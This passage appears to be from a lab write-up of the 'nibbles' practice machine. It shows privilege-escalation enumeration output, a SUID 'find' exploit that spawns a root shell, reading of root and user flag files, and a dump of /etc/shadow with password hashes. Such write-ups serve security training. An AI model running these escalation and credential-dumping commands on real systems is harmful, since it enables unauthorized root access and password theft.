[i] net560 Listening UDP................................................... skip                                                                                        
===============================================================( services )=====                                                                                        
[!] srv000 Can we write in service files?.................................. nope
[!] srv010 Can we write in binaries executed by services?.................. nope
[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip                                                                                        
[i] srv420 List /etc/xinetd.d if used...................................... skip                                                                                        
[i] srv430 List /etc/init.d/ permissions................................... skip                                                                                        
[i] srv440 List /etc/rc.d/init.d permissions............................... skip                                                                                        
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip                                                                                        
[i] srv460 List /etc/init/ permissions..................................... skip                                                                                        
[!] srv500 Can we write in systemd service files?.......................... nope                                                                                        
[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
===============================================================( software )=====                                                                                        
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof015 Are there credentials in mysql_history file?.................... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. yes!
---
                                                    version                                                     
---
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ yes!
[!] sof040 Found any .htpasswd files?...................................... nope
[!] sof050 Are there private keys in ssh-agent?............................ nope
[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
[!] sof070 Can we write to a ssh-agent socket?............................. nope
[!] sof080 Can we write to a gpg-agent socket?............................. nope
[!] sof090 Found any keepass database files?............................... nope
[!] sof100 Found any 'pass' store directories?............................. nope
[!] sof110 Are there any tmux sessions available?.......................... nope
[*] sof120 Are there any tmux sessions from other users?................... nope
[!] sof130 Can we write to tmux session sockets from other users?.......... nope
[!] sof140 Are any screen sessions available?.............................. nope
[*] sof150 Are there any screen sessions from other users?................. nope
[!] sof160 Can we write to screen session sockets from other users?........ nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip                                                                                        
[i] sof520 Postgres version................................................ skip                                                                                        
[i] sof530 Apache version.................................................. skip                                                                                        
[i] sof540 Tmux version.................................................... skip                                                                                        
[i] sof550 Screen version.................................................. skip                                                                                        
=============================================================( containers )=====                                                                                        
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the 'docker' group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
==============================================================( processes )=====
[i] pro000 Waiting for the process monitor to finish....................... yes!
[i] pro001 Retrieving process binaries..................................... yes!
[i] pro002 Retrieving process users........................................ yes!
[!] pro010 Can we write in any process binary?............................. nope
[*] pro020 Processes running with root permissions......................... yes!
[*] pro030 Processes running by non-root users with shell.................. yes!
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip                                                                                        
                                                                                                                                                                        
==================================( FINISHED )==================================                                                                                        
postgres@nibbles:/tmp$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/find
/usr/bin/sudo
/usr/bin/umount
postgres@nibbles:/tmp$ find . -exec /bin/sh -p \; -quit
find . -exec /bin/sh -p \; -quit
# bash -p
bash -p
bash-5.0# cd /root
cd /root
bash-5.0# ls
ls
proof.txt
bash-5.0# cat proof.txt
cat proof.txt
b7364fc1e71475f2dc116f6c4ead273f
bash-5.0# ifconfig
ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.123.47  netmask 255.255.255.0  broadcast 192.168.123.255
        ether 00:50:56:ba:6f:16  txqueuelen 1000  (Ethernet)
        RX packets 1191385  bytes 165771510 (158.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 988352  bytes 461660586 (440.2 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2612  bytes 892361 (871.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2612  bytes 892361 (871.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

bash-5.0# 

```

![](Pasted%20image%2020220116012016.png)

```
bash-5.0# cat /etc/shadow
cat /etc/shadow
root:$6$tdLMoNDJbjomSsJL$MqqiqIJm5n1SFx9LUPIrhqkDFHwRwWoID/Db/gzK2eatji0/CF8bEILDfUkNwTYEUIuGKOCdWDLGh/oD5qWhZ0:18379:0:99999:7:::
daemon:*:18379:0:99999:7:::
bin:*:18379:0:99999:7:::
sys:*:18379:0:99999:7:::
sync:*:18379:0:99999:7:::
games:*:18379:0:99999:7:::
man:*:18379:0:99999:7:::
lp:*:18379:0:99999:7:::
mail:*:18379:0:99999:7:::
news:*:18379:0:99999:7:::
uucp:*:18379:0:99999:7:::
proxy:*:18379:0:99999:7:::
www-data:*:18379:0:99999:7:::
backup:*:18379:0:99999:7:::
list:*:18379:0:99999:7:::
irc:*:18379:0:99999:7:::
gnats:*:18379:0:99999:7:::
nobody:*:18379:0:99999:7:::
_apt:*:18379:0:99999:7:::
systemd-timesync:*:18379:0:99999:7:::
systemd-network:*:18379:0:99999:7:::
systemd-resolve:*:18379:0:99999:7:::
messagebus:*:18379:0:99999:7:::
sshd:*:18379:0:99999:7:::
wilson:$6$7gyf1eQmnUERUC/v$eW5RoRAQMtZGQDEu8PPtUNo.1EcDLK0nT1W5IfiCcC2PKvI8t2dRLSdluxtYYqIdoH5mTsttuIqFgHO/cCLrE0:18379:0:99999:7:::
systemd-coredump:!!:18379::::::
postgres:*:18379:0:99999:7:::
Debian-snmp:!:18379:0:99999:7:::
ftp:*:18379:0:99999:7:::
bash-5.0# ls /home/wilson
ls /home/wilson
ftp  local.txt
bash-5.0# cat /home/wilson
cat /home/wilson
cat: /home/wilson: Is a directory
bash-5.0# cat /home/wilson/local.txt
cat /home/wilson/local.txt
5df08588f8f177704af34d86becf3bef
bash-5.0# cat proof.txt
cat proof.txt
b7364fc1e71475f2dc116f6c4ead273f
bash-5.0# ifconfig
ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.123.47  netmask 255.255.255.0  broadcast 192.168.123.255
        ether 00:50:56:ba:6f:16  txqueuelen 1000  (Ethernet)
        RX packets 1227985  bytes 171454860 (163.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1024546  bytes 478902360 (456.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2800  bytes 956329 (933.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2800  bytes 956329 (933.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

bash-5.0# exit
exit
exit
# exit
exit
postgres@nibbles:/tmp$ cd /home
cd /home
postgres@nibbles:/home$ ls
ls
wilson
postgres@nibbles:/home$ cd wilson
cd wilson
postgres@nibbles:/home/wilson$ ls
ls
ftp  local.txt
postgres@nibbles:/home/wilson$ cat local.txt
cat local.txt
5df08588f8f177704af34d86becf3bef
postgres@nibbles:/home/wilson$ ls -al
ls -al
total 32
drwxr-xr-x 4 wilson wilson  4096 Jul  9  2020 .
drwxr-xr-x 3 root   root    4096 Apr 27  2020 ..
-rw------- 1 wilson wilson     0 Apr 27  2020 .bash_history
-rw-r--r-- 1 wilson wilson   220 Apr 27  2020 .bash_logout
-rw-r--r-- 1 wilson wilson  3526 Apr 27  2020 .bashrc
dr-xr-xr-x 2 nobody nogroup 4096 Apr 27  2020 ftp
drwx------ 3 wilson wilson  4096 Apr 27  2020 .gnupg
-rw-r--r-- 1 wilson wilson    33 Jan 15 07:19 local.txt
-rw-r--r-- 1 wilson wilson   807 Apr 27  2020 .profile
postgres@nibbles:/home/wilson$ 

```



![](Pasted%20image%2020220116012216.png)


